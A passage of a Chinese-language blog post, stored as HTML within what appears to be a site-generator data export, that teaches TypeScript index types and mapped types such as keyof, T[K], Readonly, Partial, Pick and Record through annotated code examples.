ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// keyof 索引类型查询操作符，类似与 javascript 中的 for in 遍历中的取 key 操作</span></span><br><span class=\"line\"><span class=\"comment\">// T[K] 索引访问操作符，T[K][] 这里表示 取值后的类型，就是返回的类型</span></span><br><span class=\"line\"><span class=\"comment\">// pluck(person, ['name']) -&gt; T[k][] -&gt; 'Jarid'[] -&gt; string[]</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">pluck</span>&lt;<span class=\"title\">T</span>, <span class=\"title\">K</span> <span class=\"title\">extends</span> <span class=\"title\">keyof</span> <span class=\"title\">T</span>&gt;(<span class=\"params\">o: T, names: K[]</span>): <span class=\"title\">T</span>[<span class=\"title\">K</span>][] </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> names.map(<span class=\"function\"><span class=\"params\">n</span> =&gt;</span> o[n]);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">interface</span> Person &#123;</span><br><span class=\"line\">    name: <span class=\"built_in\">string</span>;</span><br><span class=\"line\">    age: <span class=\"built_in\">number</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">let</span> person: Person = &#123;</span><br><span class=\"line\">    name: <span class=\"string\">'Jarid'</span>,</span><br><span class=\"line\">    age: <span class=\"number\">35</span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"keyword\">let</span> strings: <span class=\"built_in\">string</span>[] = pluck(person, [<span class=\"string\">'name'</span>]);<span class=\"comment\">// -&gt; return ['Jarid']</span></span><br></pre></td></tr></table></figure>\n<p>编译器会检查 <code>name</code> 是否真的是 <code>Person</code> 的一个属性。 本例还引入了几个新的类型操作符。 首先是 <code>keyof T</code>， 索引类型查询操作符。 对于任何类型 <code>T</code>， <code>keyof T</code>的结果为 <code>T</code> 上已知的公共属性名的联合。例如：</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> props: keyof Person;  </span><br><span class=\"line\"><span class=\"comment\">// -&gt; name | age</span></span><br><span class=\"line\"><span class=\"comment\">// keyof Person是完全可以与 'name' | 'age'互相替换的</span></span><br></pre></td></tr></table></figure>\n<p>第二个操作符是 <code>T[K]</code>， 索引访问操作符。在这里，类型语法反映了表达式语法。 这意味着 <code>person[&#39;name&#39;]</code> 具有类型 <code>Person[&#39;name&#39;]</code> —- 在我们的例子里则为 <code>string</code> 类型。 然而，就像索引类型查询一样，你可以在普通的上下文里使用 <code>T[K]</code>，这正是它的强大所在。 你只要确保类型变量 <code>K extends keyof T</code> 就可以了。</p>\n<h4 id=\"索引类型和字符串索引签名\"><a href=\"#索引类型和字符串索引签名\" class=\"headerlink\" title=\"索引类型和字符串索引签名\"></a>索引类型和字符串索引签名</h4><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">interface</span> Map&lt;T&gt; &#123;</span><br><span class=\"line\">    [key: <span class=\"built_in\">string</span>]: T;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// Map 是一个只包含一对键值的对象 key -&gt; string，value -&gt; T</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> keys: keyof Map&lt;<span class=\"built_in\">number</span>&gt;; <span class=\"comment\">// string</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> value: Map&lt;<span class=\"built_in\">number</span>&gt;[<span class=\"string\">'foo'</span>]; <span class=\"comment\">// number</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"映射类型\"><a href=\"#映射类型\" class=\"headerlink\" title=\"映射类型\"></a>映射类型</h3><p>通过 <code>映射类型</code> 将一个已知的类型每个属性都变为可选的/只读的。在映射类型里，新类型以相同的形式去转换旧类型里每个属性。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 转换成只读属性</span></span><br><span class=\"line\"><span class=\"keyword\">type</span> Readonly&lt;T&gt; = &#123;</span><br><span class=\"line\">    readonly [P <span class=\"keyword\">in</span> keyof T]: T[P];</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 转换成可选属性</span></span><br><span class=\"line\"><span class=\"keyword\">type</span> Partial&lt;T&gt; = &#123;</span><br><span class=\"line\">    [P <span class=\"keyword\">in</span> keyof T]?: T[P];</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>使用方式：</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">type</span> PersonPartial = Partial&lt;Person&gt;;</span><br><span class=\"line\"><span class=\"keyword\">type</span> ReadonlyPerson = Readonly&lt;Person&gt;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 假设Person interface Person = &#123;age: number; gender: string; name: string&#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">type</span> Readonly&lt;T&gt; = &#123;</span><br><span class=\"line\">    readonly [P <span class=\"keyword\">in</span> keyof T]: T[P];</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// T -&gt; Person</span></span><br><span class=\"line\"><span class=\"comment\">// P in keyof T -&gt; keyof T 指的是 Person 中所有的 key</span></span><br><span class=\"line\"><span class=\"comment\">// P in keyof T -&gt; P 为 age &amp; gender &amp; name</span></span><br><span class=\"line\"><span class=\"comment\">// T[P] 取值操作</span></span><br></pre></td></tr></table></figure>\n<p>再看一个<code>包装属性</code>的例子：</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">type</span> Proxy&lt;T&gt; = &#123;</span><br><span class=\"line\">    <span class=\"keyword\">get</span>(): T;</span><br><span class=\"line\">    <span class=\"keyword\">set</span>(value: T): <span class=\"built_in\">void</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">type</span> Proxify&lt;T&gt; = &#123;</span><br><span class=\"line\">    [P <span class=\"keyword\">in</span> keyof T]: Proxy&lt;T[P]&gt;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">proxify</span>&lt;<span class=\"title\">T</span>&gt;(<span class=\"params\">o: T</span>): <span class=\"title\">Proxify</span>&lt;<span class=\"title\">T</span>&gt; </span>&#123;</span><br><span class=\"line\">   <span class=\"comment\">// ...</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">let</span> proxyProps = proxify(props);</span><br></pre></td></tr></table></figure>\n<p>是不是有种函数互相嵌套的感觉？</p>\n<p><strong><code>Pick</code></strong><br>取出指定的属性。</p>\n<p>定义：<br><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">type</span> Pick&lt;T, K <span class=\"keyword\">extends</span> keyof T&gt; = &#123;</span><br><span class=\"line\">    [P <span class=\"keyword\">in</span> K]: T[P];</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>我们用上面的Person来使用：<br><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">type</span> PickPerson = Pick&lt;Person, <span class=\"string\">'age'</span> | <span class=\"string\">'name'</span>&gt;; <span class=\"comment\">// -&gt; &#123;age: number; name: string&#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// T: Person, K: 'age' | 'name',  T: 'age' | 'gender' | 'age', P: 'age' | 'name',</span></span><br><span class=\"line\"><span class=\"comment\">// [P in K] 遍历 K</span></span><br><span class=\"line\"><span class=\"comment\">// T[P] 取值</span></span><br></pre></td></tr></table></figure></p>\n<p><strong><code>Record</code></strong><br>将传入的属性统一定义类型。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">type</span> Record&lt;K <span class=\"keyword\">extends</span> <span class=\"built_in\">string</span>, T&gt; = &#123;</span><br><span class=\"line\">    [P <span class=\"keyword\">in</span> K]: T;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">type</span> RecordPerson = Record&lt;<span class=\"string\">'gender'</span> | <span class=\"string\">'name'</span>, <span class=\"built_in\">string</span>&gt;; <span class=\"comment\">// -&gt; &#123;gender: string; name: string&#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// K: 'gender' | 'name', T: string</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"由映射类型进行推断\"><a href=\"#由映射类型进行推断\" class=\"headerlink\" title=\"由映射类型进行推断\"></a>由映射类型进行推断</h4><p>上面是包装属性，下面看下如何拆包。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">unproxify</span>&lt;<span class=\"title\">T</span>&gt;(<span class=\"params\">t: Proxify&lt;T&gt;</span>): <span class=\"title\">T</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> result = &#123;&#125; <span class=\"keyword\">as</span> T;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">const</span> k <span class=\"keyword\">in</span> t) &#123;</span><br><span class=\"line\">        result[k] = t[k].get();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>"}],"PostAsset":[],"PostCategory":[],"PostTag":[],"Tag":[]}}